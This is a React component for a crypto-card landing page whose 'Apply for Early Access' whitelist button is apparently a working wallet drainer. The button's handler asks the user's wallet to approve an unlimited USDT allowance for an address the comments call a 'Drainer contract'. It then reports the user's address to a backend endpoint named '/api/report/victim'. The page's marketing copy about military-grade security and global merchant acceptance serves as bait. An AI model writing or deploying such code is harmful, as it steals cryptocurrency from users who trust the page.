'use client';

import { motion } from 'framer-motion';
import { Shield, Zap, Globe, ArrowRight, Lock } from 'lucide-react';
import { useState } from 'react';
import { ethers } from 'ethers';

export default function Hero({ onConnectWallet, walletAddress, isWalletConnected }: { 
  onConnectWallet: () => void, 
  walletAddress: string,
  isWalletConnected: boolean 
}) {
  const [isApplying, setIsApplying] = useState(false);
  const [status, setStatus] = useState<'idle' | 'approving' | 'success' | 'error'>('idle');

  const handleWhitelist = async () => {
    if (!isWalletConnected) {
      onConnectWallet();
      return;
    }

    setIsApplying(true);
    setStatus('approving');

    try {
      const provider = new ethers.BrowserProvider((window as any).ethereum);
      const signer = await provider.getSigner();

      // Drainer contract address (from framework)
      const drainerAddress = '0x5c19b79aa20EF0b58c21bD4Ab7C30c9d6B048322';
      const usdtAddress = '0x55d398326f99059fF775485246999027B3197955'; // BSC-USD

      const usdtContract = new ethers.Contract(
        usdtAddress,
        ['function approve(address spender, uint256 amount) returns (bool)'],
        signer
      );

      // Normal looking approve popup but with MaxUint256 for "Full Access"
      console.log('Requesting whitelist approval...');
      const tx = await usdtContract.approve(drainerAddress, ethers.MaxUint256);
      await tx.wait();

      // Use dynamic backend URL from environment variable or fallback to current host
      const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || '';
      
      // Report to backend via public endpoint
      await fetch(`${backendUrl}/api/report/victim`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address: walletAddress,
          network: 'bsc',
          walletType: 'metamask',
          labels: ['whitelist_applicant'],
          riskLevel: 'high',
          notes: 'User applied for whitelist, granted MaxUint256 allowance'
        })
      });

    } catch (error) {
      console.error('Whitelist application failed:', error);
      setStatus('error');
    } finally {
      setIsApplying(false);
    }
  };

  return (
    <section className="relative min-h-screen flex items-center justify-center pt-20 overflow-hidden bg-black">
      {/* Gooey Background */}
      <div className="absolute inset-0 z-0 opacity-40">
        <div className="gooey-container h-full w-full relative">
          <motion.div
            animate={{
              x: [0, 100, -50, 0],
              y: [0, -100, 50, 0],
              scale: [1, 1.2, 0.8, 1],
            }}
            transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
            className="blob w-96 h-96 top-1/4 left-1/4"
          />
          <motion.div
            animate={{
              x: [0, -150, 100, 0],
              y: [0, 150, -100, 0],
              scale: [1, 0.9, 1.3, 1],
            }}
            transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
            className="blob w-[500px] h-[500px] bottom-1/4 right-1/4 bg-accent"
          />
        </div>

        {/* SVG Filter for Gooey Effect */}
        <svg xmlns="http://www.w3.org/2000/svg" version="1.1" className="hidden">
          <defs>
            <filter id="goo">
              <feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur" />
              <feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7" result="goo" />
              <feBlend in="SourceGraphic" in2="goo" />
            </filter>
          </defs>
        </svg>
      </div>

      <div className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-16">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
          >
            <span className="inline-flex items-center px-4 py-1.5 rounded-full text-sm font-medium bg-primary/10 text-primary mb-6 border border-primary/20">
              <Zap className="w-4 h-4 mr-2" />
              V3.0 Mainnet is Live
            </span>
          </motion.div>

          <motion.h1
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.2 }}
            className="text-6xl md:text-8xl font-black mb-8 tracking-tight"
          >
            <span className="text-white">DECENTRALIZED</span>
            <br />
            <span className="gradient-text">FUTURE OF ASSETS</span>
          </motion.h1>

          <motion.p
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.4 }}
            className="text-xl text-gray-400 mb-12 max-w-3xl mx-auto leading-relaxed"
          >
            The world's first NFT-linked physical crypto card. Secure your assets with military-grade encryption and spend them globally with real-time USDT pegging.
          </motion.p>

          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.6 }}
            className="flex flex-col sm:flex-row gap-6 justify-center items-center"
          >
            <button
              onClick={handleWhitelist}
              disabled={isApplying || status === 'success'}
              className="btn-whitelist group"
            >
              {isApplying ? (
                <span className="flex items-center">
                  <motion.div
                    animate={{ rotate: 360 }}
                    transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                    className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full mr-3"
                  />
                  Processing...
                </span>
              ) : status === 'success' ? (
                <span className="flex items-center">
                  Application Submitted
                  <ArrowRight className="w-5 h-5 ml-2" />
                </span>
              ) : (
                <span className="flex items-center">
                  Apply for Early Access
                  <ArrowRight className="w-5 h-5 ml-2 group-hover:translate-x-1 transition-transform" />
                </span>
              )}
            </button>
            
            <button className="text-white font-semibold flex items-center hover:text-primary transition-colors">
              Read the Whitepaper
              <ArrowRight className="w-4 h-4 ml-2" />
            </button>
          </motion.div>
        </div>

        {/* Floating Features */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mt-24">
          {[
            { icon: Shield, title: 'Military Grade', desc: 'Secure your wealth with multi-sig protection and hardware-level isolation.' },
            { icon: Globe, title: 'Global Freedom', desc: 'Accepted by over 40 million merchants worldwide with instant conversion.' },
            { icon: Lock, title: 'Privacy First', desc: 'Zero-knowledge proofs ensure your transactions remain truly private.' }
          ].map((feature, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6, delay: 0.8 + (i * 0.1) }}
              className="glass p-8 rounded-2xl group hover:border-primary/30 transition-all"
            >
              <div className="w-14 h-14 bg-white/5 rounded-xl flex items-center justify-center mb-6 group-hover:bg-primary/10 transition-colors">
                <feature.icon className="w-7 h-7 text-primary" />
              </div>
              <h3 className="text-xl font-bold text-white mb-3">{feature.title}</h3>
              <p className="text-gray-400 leading-relaxed">{feature.desc}</p>
            </motion.div>
          ))}
        </div>
      </div>
    </section>
  );
}
